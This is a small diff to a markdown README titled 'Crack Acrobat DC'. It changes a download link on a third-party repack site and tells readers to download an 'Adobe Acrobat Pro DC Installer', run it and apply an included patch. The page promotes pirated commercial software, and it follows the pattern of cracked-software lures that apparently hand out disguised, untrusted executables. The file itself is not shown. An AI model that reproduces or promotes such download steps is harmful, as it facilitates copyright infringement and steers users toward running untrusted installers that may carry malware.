@@ -1,7 +1,7 @@
 # Crack Acrobat DC
 
 ## Tutorial
-- Step 1: Download file **"Adobe Acrobat Pro DC Installer"** Link: [Download Set-Up](https://repack-pc.info/dl/)
+- Step 1: Download file **"Adobe Acrobat Pro DC Installer"** Link: [Download Set-Up](https://repack-pc.info/ddl/)
 - Step 2: Run the installer and follow the on-screen instructions
 - Step 3: Complete installation and apply any included patch or instructions from the downloaded file
 - Step 4: Enjoy
